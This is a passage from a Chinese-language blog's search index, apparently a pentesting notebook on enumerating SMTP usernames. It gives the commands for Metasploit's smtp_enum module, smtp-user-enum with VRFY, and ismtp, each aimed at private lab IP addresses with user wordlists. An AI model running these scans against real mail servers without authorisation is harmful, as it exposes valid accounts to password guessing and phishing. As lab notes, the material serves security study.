class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smtp/smtp_enum</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.1.101</span><br><span class="line"><span class="built_in">set</span> rport 25</span><br><span class="line"><span class="built_in">set</span> threads  //可以加快进行速度。</span><br><span class="line"><span class="built_in">set</span> user_file /root/Desktop/user.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>下一款工具smtp-user-enum<br>用来专门进行smtp用户名枚举工具<br>用法：：    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smtp-user-enum -M VRFY-U /root/Desktop/user.txt -t 192.168.1.106</span><br></pre></td></tr></table></figure><p>再来一款：<br>ismtp测试用户名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ismtp -h [ip]:25 -e /root/desktop/email.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> encryptAsDiary </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
